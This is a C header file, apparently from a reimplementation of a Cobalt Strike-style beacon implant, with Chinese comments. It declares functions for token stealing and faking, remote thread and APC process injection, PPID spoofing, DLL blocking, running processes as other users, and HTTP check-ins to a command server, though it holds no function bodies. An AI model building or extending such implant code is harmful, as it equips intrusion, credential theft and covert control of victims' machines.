#pragma once
#include "Utils.h"
#include "Global.h"
#include <stdio.h>
#include <wininet.h>
#pragma comment(lib,"Advapi32.lib")

/// <summary>
/// 全局beacon的TokenHandle
/// </summary>
extern HANDLE pTokenHandle;

/// <summary>
/// win http flags
/// </summary>
extern DWORD g_dwFlags;

/// <summary>
/// 
/// </summary>
extern HINTERNET g_hInternet;

/// <summary>
/// 
/// </summary>
extern HINTERNET g_hConnect;

/// <summary>
/// 
/// </summary>
extern DWORD_PTR g_dwContext;

/*判断系统架构*/
int Is_Wow64(HANDLE hProcess);
/*判断是否是管理员权限*/
BOOL is_admin();


void get_pc_info(beaconmetadata* pmetadata);
void set_winit_http(LPCSTR lpszServerName, INTERNET_PORT ServerPort, LPCSTR lpszAgent);


void restore_token_fake();

/// <summary>
/// 关闭token伪造
/// </summary>
void close_token_fake();

/// <summary>
/// 根据beacon配置设置一些http选项
/// </summary>
void set_http_opt(HINTERNET hInternet);

void init_socket_options();

/// <summary>
/// 判断http请求返回是否成功
/// </summary>
/// <param name="hRequest"></param>
/// <returns></returns>
BOOL verify_http_200(HINTERNET hRequest);


int isPPIDAndBlockDLL(int PPID);

BOOL __cdecl toWideChar(char* lpMultiByteStr, wchar_t* lpWideCharStr, unsigned int max);

int is_process_arch(HANDLE hProcess);

_PROC_THREAD_ATTRIBUTE_LIST* CreateProcessAttributeList(DWORD dwAttributeCount);

void BeaconcloseHandle(BeaconCreateprocess* pBeaconCreateprocess);

void BeaconSetErrorMode(BeaconCreateprocess* pBeaconCreateprocess);

void BeaconcloseAllHandle(_PROCESS_INFORMATION* pi);



BOOL BeaconCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter);

BOOL BeaconCreateThread(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter);

BOOL BeaconRtlCreateUserThread(HANDLE hProcess, LPVOID BaseAddress, LPVOID lpParameter);

int sub_1000535D(HANDLE hProcess, LPVOID BaseAddress, LPVOID lpParameter);

int sub_10004DDE(BeaconProcessInject* pBeaconProcessInject, LPVOID BaseAddress, LPVOID lpParameter);

BOOL sub_10004FA1(int Remote,HANDLE hProcess,PVOID BaseAddress,LPVOID lpParameter,LPCSTR lpModuleName,LPCSTR lpProcName,int offset);

BOOL BeaconNtQueueApcThread(BeaconProcessInject* pBeaconProcessInject, LPVOID BaseAddress, LPVOID lpParameter);

void BeaconExpandEnvironmentStringsA(LPCSTR lpSrc, LPSTR lpDst, size_t Size);

void BeaconTaskErrorOutput(u_long BeaconErrorsType, int err_code_1, u_long err_code_2, char* buffer);

void check_close_token_fake(int ignoreToken);
void check_restore_token_fake(int ignoreToken);

void beacon_GetUID();

extern datap* BeaconMaketoken;
void BeaconRevertToken();

void beacon_steal_token(char* Taskdata, int Task_size);

void beacon_ps(char* Taskdata, int Task_size);

void beacon_Kill(char* Taskdata, int Task_size);
int BeaconRunAsProcess(
	char* lpDomain,
	char* lpPassword,
	char* lpUsername,
	char* lpCommandLine,
	int dwCreationFlags,
	LPPROCESS_INFORMATION lpProcessInformation);

void beacon_RunAs(char* Taskdata, int Task_size);

void beacon_pwd();

void BeaconSleepN(char* Taskdata, int Task_size);

void beacon_make_token(char* Taskdata, int Task_size);

int get_user_sid(size_t BufferSize, HANDLE TokenHandle, char* Buffer);

int CheckMemoryRWX(LPVOID lpAddress, SIZE_T dwSize);

void __cdecl beacon_SetEnv(const char* EnvString);

void beacon_PPID(char* Taskdata, int Task_size);

void beacon_GetPrivs(char* Taskdata, int Task_size);

void beacon_BlockDLLs(char* Taskdata, int Task_size);

void BeaconSpawnas(char* Taskdata, int Task_size, int x86);

void BeaconSpawnu(char* Taskdata, int Task_size, int x86);

void sub_1000715A();

void Beacon_end();

void close_http_Handle();

BOOL X86orX64();